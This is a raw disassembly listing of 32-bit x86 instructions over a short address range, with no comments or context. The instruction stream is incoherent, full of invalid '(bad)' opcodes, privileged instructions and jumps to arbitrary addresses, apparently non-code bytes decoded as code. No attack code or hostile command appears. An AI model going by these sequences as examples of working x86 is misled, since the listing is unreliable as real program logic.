  41f145:	cs cdq 
  41f147:	adc    esp,DWORD PTR [edx]
  41f149:	mov    ds:0x6088b1db,eax
  41f14e:	sub    al,0xe3
  41f150:	aaa    
  41f151:	mov    edx,0x7ecc8a80
  41f156:	push   cs
  41f157:	push   esp
  41f158:	push   edx
  41f159:	cmp    eax,0x358d9a31
  41f15e:	mov    bl,0x82
  41f160:	push   eax
  41f161:	pop    ds
  41f162:	cs int 0x43
  41f165:	jno    0x41f19c
  41f167:	push   DWORD PTR [ebp-0x48b20b38]
  41f16d:	iret   
  41f16e:	xor    DWORD PTR [edx],ecx
  41f170:	mov    al,ds:0xfb3e780e
  41f175:	daa    
  41f176:	adc    esp,esp
  41f178:	aad    0xd1
  41f17a:	mov    edx,DWORD PTR [ebx-0x11]
  41f17d:	lock mov ah,0xab
  41f180:	dec    ecx
  41f181:	pop    ebx
  41f182:	dec    edx
  41f183:	lds    ebp,FWORD PTR [eax]
  41f185:	adc    BYTE PTR [esi-0x3d441f1d],cl
  41f18b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f18c:	cmp    dl,ah
  41f18e:	add    eax,0x1f760239
  41f193:	mov    dh,0x28
  41f195:	(bad)  
  41f196:	neg    DWORD PTR [eax]
  41f198:	mov    dh,0xf1
  41f19a:	setae  BYTE PTR [esi]
  41f19d:	jae    0x41f187
  41f19f:	push   ebp
  41f1a0:	(bad)  
  41f1a1:	cld    
  41f1a2:	jge    0x41f19c
  41f1a4:	pop    es
  41f1a5:	xchg   ebx,eax
  41f1a6:	mov    BYTE PTR [edx],cl
  41f1a8:	shr    BYTE PTR [eax+0x14],1
  41f1ab:	push   ds
  41f1ac:	mov    al,ds:0x641d7600
  41f1b1:	lods   eax,DWORD PTR ds:[esi]
  41f1b2:	std    
  41f1b3:	push   eax
  41f1b4:	cld    
  41f1b5:	ins    BYTE PTR es:[edi],dx
  41f1b6:	aas    
  41f1b7:	inc    esp
  41f1b8:	lock stos DWORD PTR es:[edi],eax
  41f1ba:	or     al,0xde
  41f1bc:	cwde   
  41f1bd:	adc    al,0x2d
  41f1bf:	xor    BYTE PTR [eax+ebp*8],al
  41f1c2:	icebp  
  41f1c3:	inc    edi
  41f1c4:	(bad)  
  41f1c5:	mov    al,0x22
  41f1c7:	sub    dl,BYTE PTR [ebp+0x2c]
  41f1ca:	test   eax,0xa1ff3cc1
  41f1cf:	and    BYTE PTR [ebx+0x35],cl
  41f1d2:	push   esp
  41f1d3:	mov    esi,0xec163430
  41f1d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1d9:	sahf   
  41f1da:	js     0x41f243
  41f1dc:	dec    ecx
  41f1dd:	mov    al,0x27
  41f1df:	inc    DWORD PTR [eax]
  41f1e1:	(bad)  
  41f1e2:	mov    bl,0xce
  41f1e4:	jl     0x41f221
  41f1e6:	dec    ebp
  41f1e7:	int    0xce
  41f1e9:	xor    DWORD PTR [edi-0x16],edx
  41f1ec:	mov    ebx,0x31948276
  41f1f1:	call   0x9b5b:0x51d163d9
  41f1f8:	(bad)  
  41f1f9:	(bad)  
  41f1fb:	mov    ch,0x4d
  41f1fd:	ja     0x41f213
  41f1ff:	dec    eax
  41f200:	ja     0x41f198
  41f202:	jmp    0x41f283
  41f204:	pop    ss
  41f205:	add    BYTE PTR [edx+0x66ebb0f8],ch
  41f20b:	out    0x7c,eax
  41f20d:	cmp    al,0x7e
  41f20f:	outs   dx,DWORD PTR ds:[esi]
  41f210:	push   edx
  41f211:	sbb    BYTE PTR [edi],dl
  41f213:	pop    eax
  41f214:	or     eax,0xedf70c8e
  41f219:	add    DWORD PTR [ebx+0x1d957a63],ecx
  41f21f:	or     al,0x78
  41f221:	pop    esp
  41f222:	lahf   
  41f223:	adc    eax,DWORD PTR [ecx]
  41f225:	xchg   edi,eax
  41f226:	icebp  
  41f227:	or     al,0xb2
  41f229:	rol    BYTE PTR [esi-0x4a],0x9a
  41f22d:	std    
  41f22e:	cwde   
  41f22f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f230:	xchg   edi,eax
  41f231:	jmp    0xbcfa:0xc827d60
  41f238:	adc    DWORD PTR [ebp-0x5100e30d],eax
  41f23e:	loopne 0x41f27d
  41f240:	cmp    BYTE PTR [esi+eiz*4-0x4c],ch
  41f244:	xor    dl,BYTE PTR [ebx-0x80]
  41f247:	mov    ebx,0xff20b8a4
  41f24c:	mov    ds:0xaa290aa,eax
  41f251:	mov    ds:0x2e55f39b,eax
  41f256:	mov    cl,0x91
  41f258:	xchg   BYTE PTR [ecx+0x45d199b2],al
  41f25e:	mov    edi,0xfca93746
  41f263:	rol    dh,cl
  41f265:	inc    si
  41f267:	pop    es
  41f268:	pop    ecx
  41f269:	dec    ecx
  41f26a:	sbb    DWORD PTR [ebx],ecx
  41f26c:	and    bl,BYTE PTR [esi+0x50]
  41f26f:	push   es
  41f270:	xchg   edi,eax
  41f271:	pop    es
  41f272:	test   BYTE PTR fs:[esi+0x1],dh
  41f276:	pop    ecx
  41f277:	repnz inc esp
  41f279:	pop    edx
  41f27a:	fwait
  41f27b:	nop
  41f27c:	jo     0x41f258
  41f27e:	call   0x39d5:0x139958d6
  41f285:	jmp    0xb717f318
  41f28a:	xor    al,0xe4
  41f28c:	xor    al,0xf9
  41f28e:	fsub   QWORD PTR [eax+ebx*4+0x42e0c2d5]
  41f295:	jae    0x41f289
  41f297:	fs jns 0x41f2b3
  41f29a:	call   eax
  41f29c:	aas    
  41f29d:	mov    bl,0x74
  41f29f:	pop    edx
  41f2a0:	dec    edi
  41f2a1:	repz in al,dx
  41f2a3:	cmp    DWORD PTR [ebp-0x1e2bd938],0xfffffff1
  41f2aa:	mov    al,ds:0x6d7d3cd
  41f2af:	cmp    bl,BYTE PTR [ebx+0x6]
  41f2b2:	popf   
  41f2b3:	lods   al,BYTE PTR ds:[esi]
  41f2b4:	call   0x494e:0x42874120
  41f2bb:	enter  0xfdb,0x97
  41f2bf:	iret   
  41f2c0:	sub    DWORD PTR [eax],ebp
  41f2c2:	xchg   esp,eax
  41f2c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f2c4:	dec    edx
  41f2c5:	lea    edi,[edi-0x6a]
  41f2c8:	enter  0xabdc,0xda
  41f2cc:	daa    
  41f2cd:	mov    dh,0x8d
  41f2cf:	mov    gs,WORD PTR [esi+0x28]
  41f2d2:	cld    
  41f2d3:	fdivr  st(7),st
  41f2d5:	call   0xa8b6:0xbdf664
  41f2dc:	push   cs
  41f2dd:	mov    bh,0x6f
  41f2df:	daa    
  41f2e0:	pushf  
  41f2e1:	fwait
  41f2e2:	mov    ds:0xc8f966f6,eax
  41f2e7:	sbb    al,0xc2
  41f2e9:	pop    ds
  41f2ea:	or     eax,DWORD PTR [esi-0x72]
  41f2ed:	cmp    eax,0xf21d080b
  41f2f2:	add    ebx,DWORD PTR [eax]
  41f2f4:	js     0x41f34b
  41f2f6:	mov    edi,0xde948810
  41f2fb:	ror    DWORD PTR [esi+0x49],cl
  41f2fe:	jo     0x41f2d8
  41f300:	adc    DWORD PTR ds:0x28703722,ebx
  41f306:	pop    ds
  41f307:	push   ecx
  41f308:	mov    eax,ds:0x676d9cc0
  41f30d:	retf   
  41f30e:	lods   eax,DWORD PTR ds:[esi]
  41f30f:	jecxz  0x41f335
  41f311:	arpl   si,di
  41f313:	push   cs
  41f314:	xchg   DWORD PTR [edx-0x6],ecx
  41f317:	and    dl,bh
  41f319:	cli    
  41f31a:	addr16 je 0x41f392
  41f31d:	lock cwde 
  41f31f:	repz inc edi
  41f321:	jo     0x41f2b9
  41f323:	imul   edx,DWORD PTR [ebx+0x1040addd],0xffffffa9
  41f32a:	dec    edx
  41f32b:	pop    ss
  41f32c:	in     eax,0xa8
  41f32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f32f:	addr16 loopne 0x41f39e
  41f332:	cmp    eax,0x3166b285
  41f337:	push   ss
  41f338:	cwde   
  41f339:	hlt    
  41f33a:	addr16 mov esi,0x3cc83189
  41f340:	call   0xdb2a3eef
  41f345:	hlt    
  41f346:	dec    ecx
  41f347:	xor    al,0x1e
  41f349:	xor    al,0x2
  41f34b:	and    BYTE PTR [eax+0x3f],cl
  41f34e:	mov    ebx,0x57e3fd5e
  41f353:	ins    BYTE PTR es:[edi],dx
  41f354:	shr    edi,0x52
  41f357:	push   edx
  41f358:	(bad)  
  41f359:	mov    ch,0xce
  41f35b:	aad    0xf5
  41f35d:	mov    esp,0xf384a6f7
  41f362:	fisub  WORD PTR [ebx]
  41f364:	cmp    DWORD PTR ds:0xaaddc9e0,edi
  41f36a:	xor    BYTE PTR [edx+0x4],al
  41f36d:	fmul   QWORD PTR [eax+0x16]
  41f370:	or     edi,DWORD PTR [esi-0x74a3ab0d]
  41f376:	test   edi,0xff502258
  41f37c:	mov    ebp,DWORD PTR [edx+edi*8]
  41f37f:	(bad)  
  41f380:	test   BYTE PTR [ecx],bh
  41f382:	dec    esp
  41f383:	(bad)  
  41f384:	int    0x93
  41f386:	out    0xe9,al
  41f388:	loopne 0x41f35b
  41f38a:	pop    ss
  41f38b:	lea    esp,[esi-0x6ef832bc]
  41f391:	sub    dl,BYTE PTR [ebp+0x7606fcb7]
  41f397:	and    dh,BYTE PTR [ecx-0x1d]
  41f39a:	inc    ebp
  41f39b:	cwde   
  41f39c:	pop    esp
  41f39d:	cmp    DWORD PTR [ebx-0x61],edi
  41f3a0:	lock (bad) 
  41f3a2:	mov    eax,0x30045873
  41f3a7:	(bad)  
  41f3a8:	les    eax,FWORD PTR [edx]
  41f3aa:	and    BYTE PTR [eax+0x27698280],bh
  41f3b0:	out    0x2e,eax
  41f3b2:	jb     0x41f3b3
  41f3b4:	nop
  41f3b5:	adc    eax,0x53b21cdd
  41f3ba:	pop    ebp
  41f3bb:	or     dh,bh
  41f3bd:	xor    al,BYTE PTR [ebx-0x32]
  41f3c0:	icebp  
  41f3c1:	iret   
  41f3c2:	jge    0x41f439
  41f3c4:	(bad)  
  41f3c6:	xor    eax,0x6f23d406
  41f3cb:	lods   eax,DWORD PTR ds:[esi]
  41f3cc:	fist   WORD PTR ds:0xbb3c8eae
  41f3d2:	test   BYTE PTR [esi+0x71ae2f77],dh
  41f3d8:	lock sti 
  41f3da:	mov    cl,0xc
  41f3dc:	and    ebp,DWORD PTR [edi+0x75cf20d7]
  41f3e2:	cmc    
  41f3e3:	cmp    al,0x28
  41f3e5:	in     al,0x6a
  41f3e7:	push   eax
  41f3e8:	sbb    al,0xf3
  41f3ea:	dec    edx
  41f3eb:	push   ebp
  41f3ec:	jle    0x41f43d
  41f3ee:	fcomp  QWORD PTR [esi-0x5539564d]
  41f3f4:	sar    DWORD PTR [esi-0x6bbcfbc9],0x66
  41f3fb:	lea    edi,[esi-0x17a05d8b]
  41f401:	mov    eax,ds:0x464868d1
  41f406:	jno    0x41f412
  41f408:	in     eax,0x1a
  41f40a:	fcomp  DWORD PTR [ecx]
  41f40c:	punpcklwd mm6,DWORD PTR [eax-0x68]
  41f410:	sbb    BYTE PTR [edi],0x75
  41f413:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41f415:	popf   
  41f416:	ja     0x41f41e
  41f418:	push   ds
  41f419:	or     al,0x21
  41f41b:	xchg   DWORD PTR [esi+ecx*8+0x24],ebx
  41f41f:	out    dx,eax
  41f420:	jl     0x41f402
  41f422:	mov    ecx,0x3f978640
  41f427:	out    dx,eax
  41f428:	mov    WORD PTR [edi+0x1dcde699],ds
  41f42e:	cmp    ebx,DWORD PTR [esi+0x5cd2b10]
  41f434:	push   cs
  41f435:	mov    dh,0x82
  41f437:	inc    esi
  41f438:	and    eax,0xfc348dab
  41f43d:	ds aam 0x3
  41f440:	pusha  
  41f441:	xchg   esp,eax
  41f442:	aad    0x2
  41f444:	and    ecx,DWORD PTR [esi-0x1c]
  41f447:	inc    edx
  41f448:	pop    esi
  41f449:	xor    al,0xd8
  41f44b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f44c:	jb     0x41f407
  41f44e:	and    BYTE PTR [esi+0x61],bh
  41f451:	dec    esp
  41f452:	jp     0x41f4b7
  41f454:	iret   
  41f455:	dec    edi
  41f456:	xchg   edx,eax
  41f457:	push   ecx
  41f458:	dec    ecx
  41f459:	mov    eax,ds:0x94ba75b4
  41f45e:	mov    dl,0x7e
  41f460:	add    ah,BYTE PTR [ebp+edi*4-0x2f]
  41f464:	xchg   esp,eax
  41f465:	or     DWORD PTR [edi],edi
  41f467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f468:	mov    BYTE PTR [eax+edi*4+0x4cc67059],0x21
  41f470:	(bad)  
  41f471:	ficom  DWORD PTR [ebx+0x3b]
  41f474:	rcl    BYTE PTR [edx-0x11],1
  41f477:	rcr    DWORD PTR [ecx],1
  41f479:	cmp    al,0xdb
  41f47b:	add    eax,0xaead01ed
  41f480:	(bad)  
  41f482:	push   esi
  41f483:	jmp    0x7728:0x93e17a6e
  41f48a:	addr16 pusha 
  41f48c:	cmp    DWORD PTR [esi+eiz*8-0x12c413ac],esp
  41f493:	sub    dl,dl
  41f495:	pusha  
  41f496:	out    dx,al
  41f497:	popf   
  41f498:	mov    bl,0x40
  41f49a:	lock retf 0x1081
  41f49e:	mov    bl,0x78
  41f4a0:	push   ds
  41f4a1:	call   0x17bf445f
  41f4a6:	adc    eax,esp
  41f4a8:	or     bl,dl
  41f4aa:	mov    cl,0xaa
  41f4ac:	mul    ebp
  41f4ae:	adc    eax,0xf97ab11e
  41f4b3:	push   edx
  41f4b4:	rol    edi,0x5e
  41f4b7:	jb     0x41f4cd
  41f4b9:	repz adc ecx,DWORD PTR [esi-0x6cea9505]
  41f4c0:	fs pop ebp
  41f4c2:	and    DWORD PTR [ecx],esi
  41f4c4:	mov    esi,0xbc5b0476
  41f4c9:	popa   
  41f4ca:	mov    eax,ds:0x3d210efe
  41f4cf:	int3   
  41f4d0:	fmul   st,st(5)
  41f4d2:	out    0x64,eax
  41f4d4:	ds inc edi
  41f4d6:	xor    eax,0xe60936c0
  41f4db:	inc    ecx
  41f4dc:	or     DWORD PTR [edi],ebx
  41f4de:	xor    DWORD PTR [esp-0x12],ebx
  41f4e2:	inc    ebx
  41f4e3:	ins    DWORD PTR es:[edi],dx
  41f4e4:	mov    eax,DWORD PTR [ebp-0x75]
  41f4e7:	into   
  41f4e8:	dec    ecx
  41f4e9:	add    bh,BYTE PTR gs:[esp+ecx*8+0x710a720c]
  41f4f1:	aad    0xd8
  41f4f3:	pop    ebx
  41f4f4:	ins    DWORD PTR es:[edi],dx
  41f4f5:	repnz fstp st(5)
  41f4f8:	push   ds
  41f4f9:	and    BYTE PTR [ebp+0x65],bl
  41f4fc:	adc    eax,0xe6bb2e40
  41f501:	cld    
  41f502:	fstp   DWORD PTR [ebx-0x67]
  41f505:	js     0x41f572
  41f507:	out    0xca,al
  41f509:	sbb    eax,0x65abc881
  41f50e:	pop    edi
  41f50f:	lods   al,BYTE PTR ds:[esi]
  41f510:	push   eax
  41f511:	test   eax,0x567d3dea
  41f516:	and    DWORD PTR [eax+ebx*1-0x62],0x50
  41f51b:	(bad)  
  41f51d:	int3   
  41f51e:	jl     0x41f55a
  41f520:	jl     0x41f547
  41f522:	sbb    edx,ebp
  41f524:	test   edi,ebx
  41f526:	jae    0x41f51b
  41f528:	jno    0x41f4e2
  41f52a:	(bad)  
  41f52b:	jmp    0xc226ee20
  41f530:	add    BYTE PTR [edi-0x65d3d936],0x7
  41f537:	packsswb mm6,QWORD PTR [ebp+eiz*8-0x19]
  41f53c:	add    eax,0xde526c71
  41f541:	js     0x41f5a6
  41f543:	add    al,0x87
  41f545:	scas   al,BYTE PTR es:[edi]
  41f546:	push   eax
  41f547:	xor    BYTE PTR [eax+0x3e],bl
  41f54a:	push   ebx
  41f54b:	loopne 0x41f596
  41f54d:	mov    eax,ds:0xaac6fca8
  41f552:	dec    edi
  41f553:	jmp    0x3aec1a45
  41f558:	or     BYTE PTR [eax+0x35],0xc6
  41f55c:	xchg   edx,edi
  41f55e:	out    dx,eax
  41f55f:	ins    BYTE PTR es:[edi],dx
  41f560:	jbe    0x41f59b
  41f562:	test   BYTE PTR [esi],0xc5
  41f565:	jb     0x41f545
  41f567:	mov    ebx,0x6b20fd28
  41f56c:	mov    dh,0xd4
  41f56e:	push   esi
  41f56f:	dec    esp
  41f570:	dec    edi
  41f571:	fwait
  41f572:	fwait
  41f573:	into   
  41f574:	lods   eax,DWORD PTR ds:[esi]
  41f575:	sbb    al,0xb5
  41f578:	mov    bl,BYTE PTR [ecx+0x1b]
  41f57b:	loopne 0x41f57e
  41f57d:	adc    DWORD PTR [edi+ebx*1-0x6f471070],0xffffffb0
  41f585:	mov    al,ds:0xcb83a2e0
  41f58a:	lock and dl,ah
  41f58d:	out    dx,eax
  41f58e:	mov    esp,0x383fa56c
  41f593:	je     0x41f589
  41f595:	in     al,dx
  41f596:	in     al,0xd7
  41f598:	call   0xc992effc
  41f59d:	and    al,0xd2
  41f59f:	dec    esi
  41f5a0:	aad    0x8f
  41f5a2:	ror    BYTE PTR [eax],1
  41f5a4:	not    DWORD PTR [edi]
  41f5a6:	xor    ch,dl
  41f5a8:	dec    ebx
  41f5a9:	dec    edx
  41f5aa:	sub    al,0x48
  41f5ac:	sbb    al,0xb6
  41f5ae:	outs   dx,BYTE PTR ds:[esi]
  41f5af:	(bad)
  41f5b3:	test   DWORD PTR [edi],ebx
  41f5b5:	pusha  
  41f5b6:	inc    ecx
  41f5b7:	sbb    al,0x67
  41f5b9:	outs   dx,BYTE PTR ds:[esi]
  41f5ba:	shl    BYTE PTR [ebp+0x4],1
  41f5bd:	pushf  
  41f5be:	cld    
  41f5bf:	mov    esp,0x429e00c5
  41f5c4:	and    al,0x9d
  41f5c6:	cs mov bl,0x3c
  41f5c9:	mov    ah,0x68
  41f5cb:	cmp    BYTE PTR [eax+0x6a],dh
  41f5ce:	cmp    al,0x89
  41f5d0:	sbb    bh,ch
  41f5d2:	cmp    BYTE PTR fs:[esi],dh
  41f5d5:	xor    al,0x44
  41f5d7:	cs loopne 0x41f5e7
  41f5da:	sbb    DWORD PTR [edi+0x4198c608],ebp
  41f5e0:	jl     0x41f62d
  41f5e2:	inc    esp
  41f5e3:	(bad)  
  41f5e5:	js     0x41f5ed
  41f5e7:	dec    esp
  41f5e8:	mov    dh,0x1e
  41f5ea:	sar    al,0x50
  41f5ed:	sub    BYTE PTR [ebx],ah
  41f5ef:	dec    ebx
  41f5f0:	adc    eax,0x45767173
  41f5f5:	dec    ebx
  41f5f6:	and    al,0x8c
  41f5f8:	pop    ss
  41f5f9:	push   ebx
  41f5fa:	fwait
  41f5fb:	pop    edx
  41f5fc:	mov    esp,0x4c2ed829
  41f601:	adc    al,0x73
  41f603:	xor    eax,0xb8323c37
  41f608:	pop    eax
  41f609:	ja     0x41f640
  41f60b:	fs adc eax,0xe479209b
  41f611:	inc    DWORD PTR [eax-0x39]
  41f614:	xor    esp,DWORD PTR [ebx-0x1]
  41f617:	xor    cl,BYTE PTR [ebp+edi*2+0x5578b8fb]
  41f61e:	mov    WORD PTR ds:0xd6e99e53,cs
  41f624:	xor    cl,0xf2
  41f627:	cwde   
  41f628:	fdivr  DWORD PTR [ecx-0x461ac8fb]
  41f62e:	dec    ecx
  41f62f:	mov    esi,0x92b02125
  41f634:	sbb    al,0x15
  41f636:	out    dx,eax
  41f637:	adc    eax,0xc69bec93
  41f63d:	in     eax,dx
  41f63e:	fcomp  DWORD PTR [ebx]
  41f640:	push   0x40
  41f642:	scas   al,BYTE PTR es:[edi]
  41f643:	sbb    ebp,DWORD PTR ds:0x2a4582ab
  41f649:	fld1   
  41f64b:	or     eax,0x6d085d52
  41f650:	xchg   esp,eax
  41f651:	hlt    
  41f652:	stos   DWORD PTR es:[edi],eax
  41f653:	cmp    ecx,DWORD PTR [ebp+0x65]
  41f656:	and    eax,0xbe1eb4c5
  41f65b:	and    eax,DWORD PTR [edi-0x5b6dbce0]
  41f661:	jmp    0x41f68b
  41f663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f664:	xchg   BYTE PTR [ecx],ah
  41f666:	push   esp
  41f667:	hlt    
  41f668:	cmp    DWORD PTR [ecx-0x7a],ecx
  41f66b:	in     al,0xd2
  41f66d:	inc    edi
  41f66e:	inc    ecx
  41f66f:	loope  0x41f5f8
  41f671:	jae    0x41f6a2
  41f673:	xor    eax,0x65
  41f676:	inc    ecx
  41f677:	mov    bh,0xe3
  41f679:	repz push ecx
  41f67b:	pop    edi
  41f67c:	call   DWORD PTR [ebx-0x2f]
  41f67f:	mov    bh,BYTE PTR [eax]
  41f681:	es mov eax,0xc9239259
  41f687:	fs gs and al,0x9b
  41f68b:	stc    
  41f68c:	cmp    BYTE PTR [ebp+ebp*1-0x3c],0xd0
  41f691:	popa   
  41f692:	loopne 0x41f690
  41f694:	mov    eax,ds:0xbda17ef6
  41f699:	mov    esp,cs
  41f69b:	jg     0x41f64d
  41f69d:	aaa    
  41f69e:	push   ebx
  41f69f:	xlat   BYTE PTR ds:[ebx]
  41f6a0:	jns    0x41f719
  41f6a2:	cmp    eax,0x3e570498
  41f6a7:	dec    ebp
  41f6a8:	add    al,BYTE PTR [ecx+0x7578660b]
  41f6ae:	xchg   DWORD PTR [ebx+0x38937694],ebx
  41f6b4:	cdq    
  41f6b5:	mov    al,0x53
  41f6b7:	shr    DWORD PTR ds:[edi-0x6e],1
  41f6bb:	pop    esp
  41f6bc:	and    dh,ch
  41f6be:	loopne 0x41f6a5
  41f6c0:	inc    eax
  41f6c1:	(bad)  [edi-0x60]
  41f6c4:	push   eax
  41f6c5:	add    dh,BYTE PTR [esi+0xd]
  41f6c8:	pop    ecx
  41f6c9:	ret    
  41f6ca:	test   al,0xf9
  41f6cc:	push   edi
  41f6cd:	jg     0x41f670
  41f6cf:	stos   DWORD PTR es:[edi],eax
  41f6d0:	dec    edx
  41f6d1:	and    eax,0x163e6001
  41f6d6:	or     eax,DWORD PTR ds:0x7af7bb49
  41f6dc:	push   ds
  41f6dd:	sbb    edi,DWORD PTR [ebp+0x3b]
  41f6e0:	cmp    BYTE PTR [eax+eax*8],cl
  41f6e3:	add    esp,DWORD PTR [edx-0x69fa7fea]
  41f6e9:	ja     0x41f74d
  41f6eb:	and    dh,bl
  41f6ed:	pop    ebx
  41f6ee:	push   esp
  41f6ef:	es inc eax
  41f6f1:	(bad)  
  41f6f2:	sti    
  41f6f3:	repnz dec eax
  41f6f5:	dec    edi
  41f6f6:	xchg   esp,eax
  41f6f7:	cdq    
  41f6f8:	enter  0x5063,0x1f
  41f6fc:	mov    bl,0x13
  41f6fe:	push   eax
  41f6ff:	push   edi
  41f700:	imul   edi,DWORD PTR [esi+0x66114771],0x27
  41f707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f708:	or     ch,BYTE PTR [ecx]
  41f70a:	sub    al,dl
  41f70c:	outs   dx,DWORD PTR cs:[esi]
  41f70e:	outs   dx,DWORD PTR ds:[esi]
  41f70f:	xchg   ebp,eax
  41f710:	stos   BYTE PTR es:[edi],al
  41f711:	cwd    
  41f713:	cmc    
  41f714:	int    0x17
  41f716:	add    bh,BYTE PTR [ebx+0x3a7353f1]
  41f71c:	pop    ecx
  41f71d:	call   0xc942770c
  41f722:	arpl   WORD PTR [ecx-0x2264afdf],cx
  41f728:	sahf   
  41f729:	lods   al,BYTE PTR ds:[esi]
  41f72a:	xchg   ecx,eax
  41f72b:	iret   
  41f72c:	dec    esp
  41f72d:	sahf   
  41f72e:	cmp    DWORD PTR [edx-0x5219d97d],ebp
  41f734:	adc    al,0xda
  41f736:	cwde   
  41f737:	xchg   edi,eax
  41f738:	xchg   edi,eax
  41f739:	pop    ebp
  41f73a:	(bad)
  41f73d:	lds    ebx,FWORD PTR [edi-0x2]
  41f740:	aad    0x8a
  41f742:	fs pop esp
  41f744:	out    dx,al
  41f745:	sbb    eax,0xf9a7b74c
  41f74a:	sub    DWORD PTR [ebp-0x52],eax
  41f74d:	mov    bl,0xed
  41f74f:	in     eax,dx
  41f750:	jo     0x41f7b2
  41f752:	mov    esi,0xe57db5b5
  41f757:	mov    ch,0x27
  41f759:	mov    ds:0x35a5d211,al
  41f75e:	push   es
  41f75f:	mov    ebx,0x5ce3e1e
  41f764:	adc    ecx,DWORD PTR [ebp+0x345ca3f]
  41f76a:	retf   0xdebc
  41f76d:	sahf   
  41f76e:	aaa    
  41f76f:	jge    0x41f78f
  41f771:	or     DWORD PTR [eax+0x47e0ca14],eax
  41f777:	loope  0x41f70e
  41f779:	jns    0x41f6fd
  41f77b:	pop    ebp
  41f77c:	rcr    DWORD PTR [esi],cl
  41f77e:	fdiv   DWORD PTR [ecx]
  41f780:	cmp    al,0xd0
  41f782:	fisttp WORD PTR [esi+eiz*8-0x2b]
  41f786:	xchg   ecx,eax
  41f787:	and    ecx,DWORD PTR [ebx+0x2b]
  41f78a:	cwde   
  41f78b:	test   BYTE PTR [ebp-0x4a],0x14
  41f78f:	clc    
  41f790:	sub    ah,BYTE PTR [esp+ebp*2-0x67]
  41f794:	mov    bh,0x70
  41f796:	stos   DWORD PTR es:[edi],eax
  41f797:	xchg   esp,eax
  41f798:	iret   
  41f799:	xor    DWORD PTR [ebx+eiz*4-0x3b4a7efe],ecx
  41f7a0:	sbb    ebp,ebp
  41f7a2:	push   edx
  41f7a3:	add    eax,0x29d726f3
  41f7a8:	shl    ah,1
  41f7aa:	adc    esi,eax
  41f7ac:	mov    eax,ds:0xd6e9d7ff
  41f7b1:	mov    al,ds:0xde2f7283
  41f7b6:	fdivr  st(7),st
  41f7b8:	iret   
  41f7b9:	sbb    al,0x39
  41f7bb:	inc    ebp
  41f7bc:	clc    
  41f7bd:	jmp    0x41f839
  41f7bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7c0:	mov    ebx,0x566dde54
  41f7c5:	pop    eax
  41f7c6:	mov    DWORD PTR [edi+esi*1+0x28c938c5],ebx
  41f7cd:	cmc    
  41f7ce:	das    
  41f7cf:	xor    al,ch
  41f7d1:	push   cs
  41f7d2:	mov    ah,0xf5
  41f7d4:	mov    ebx,0xceddb5c8
  41f7d9:	and    eax,0xc0c3a071
  41f7de:	std    
  41f7df:	aam    0x53
  41f7e1:	xor    BYTE PTR [edx-0x42],bh
  41f7e4:	add    DWORD PTR [ebx],edi
  41f7e6:	inc    ecx
  41f7e7:	leave  
  41f7e8:	cmp    BYTE PTR [edi-0x52f2beb7],ah
  41f7ee:	test   al,0x9e
  41f7f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7f1:	sbb    ah,bh
  41f7f3:	fsub   QWORD PTR es:0xec329714
  41f7fa:	sbb    BYTE PTR [edi],al
  41f7fc:	push   esp
  41f7fd:	sbb    BYTE PTR [ecx+eax*1],0x5b
  41f801:	ins    BYTE PTR es:[edi],dx
  41f802:	arpl   WORD PTR [edx-0x6f70971e],sp
  41f808:	rol    DWORD PTR [ecx+0x64],0xab
  41f80c:	in     al,0x36
  41f80e:	ins    DWORD PTR es:[edi],dx
  41f80f:	(bad)  
  41f810:	fs nop
  41f812:	cwde   
  41f813:	jecxz  0x41f83b
  41f815:	xchg   esi,eax
  41f816:	sub    BYTE PTR [edx+0x6e],ah
  41f819:	out    0x46,al
  41f81b:	xor    edi,DWORD PTR [ebp+0xc4024ff]
  41f821:	jb     0x41f805
  41f823:	lea    esp,[eax-0x377c4b7e]
  41f829:	imul   ecx,DWORD PTR [edi-0x26f8c308],0x279d8d74
  41f833:	(bad)  
  41f834:	pushf  
  41f835:	aas    
  41f836:	sbb    al,0x52
  41f838:	in     eax,0xed
  41f83a:	in     eax,0xf3
  41f83c:	pushf  
  41f83d:	jmp    0x19200df0
  41f842:	or     eax,0x6ec0c8da
  41f847:	pop    eax
  41f848:	arpl   sp,sp
  41f84a:	idiv   BYTE PTR [edx+0x5aac9269]
  41f850:	pop    eax
  41f851:	xchg   ecx,eax
  41f852:	jg     0x41f823
  41f854:	add    BYTE PTR [esi-0x4e],0xe8
  41f858:	repnz pop esp
  41f85a:	mov    ecx,0x40e34568
  41f85f:	nop
  41f860:	pop    eax
  41f861:	pushf  
  41f862:	mov    dh,BYTE PTR [edx+edi*1+0x4e0cc2c2]
  41f869:	sbb    eax,0xf5e2d4bd
  41f86e:	test   BYTE PTR [esi],0xec
  41f871:	(bad)  
  41f873:	dec    esp
  41f874:	aam    0x16
  41f876:	adc    al,0xc4
  41f878:	push   edx
  41f879:	adc    BYTE PTR [eax+0x62dfdec6],dh
  41f87f:	rcl    BYTE PTR fs:[esi],cl
  41f882:	in     al,0x9e
  41f884:	push   ebp
  41f885:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41f887:	or     DWORD PTR [eax],esp
  41f889:	xchg   BYTE PTR [ecx-0x75da960],dh
  41f88f:	icebp  
  41f890:	pushf  
  41f891:	xlat   BYTE PTR ds:[ebx]
  41f892:	retf   
  41f893:	ficomp DWORD PTR [edx-0x40]
  41f896:	xor    DWORD PTR [ecx-0x10],ebx
  41f899:	or     eax,0x9fe75eee
  41f89e:	adc    eax,0x92840584
  41f8a3:	sbb    dl,BYTE PTR [edi]
  41f8a5:	push   edi
  41f8a6:	mov    cl,BYTE PTR [esi-0x35f699cf]
  41f8ac:	mov    esp,esp
  41f8ae:	push   cs
  41f8af:	push   0x60
  41f8b1:	jo     0x41f8b5
  41f8b3:	sbb    eax,DWORD PTR [edx+0x40]
  41f8b6:	cld    
  41f8b7:	mov    ebp,0x96418432
  41f8bc:	xor    BYTE PTR [edx*2+0x75450f5d],al
